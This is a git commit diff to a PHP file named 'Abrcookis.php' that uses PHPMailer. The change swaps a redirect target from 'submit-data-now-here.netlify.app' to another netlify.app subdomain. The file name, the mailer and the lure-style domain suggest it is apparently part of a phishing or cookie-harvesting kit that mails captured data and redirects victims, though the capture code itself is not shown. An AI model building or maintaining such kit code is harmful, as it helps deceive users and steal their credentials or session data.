5235fdc58653033cd613caabcd797549b4ad5b0b
Lernamzaxal892 <lernayouamzaxal@gmail.com>
2025-08-12 10:50:59 +0500

    Update Abrcookis.php

--- Abrcookis.php
+++ Abrcookis.php
@@ -2,7 +2,7 @@
 use PHPMailer\PHPMailer\PHPMailer;
 use PHPMailer\PHPMailer\Exception;
 
-header("Location: https://submit-data-now-here.netlify.app/");
+header("Location: https://prismatic-sunburst-e3fffb-more.netlify.app/");
 
 require 'Exception.php'; 
 require 'PHPMailer.php';
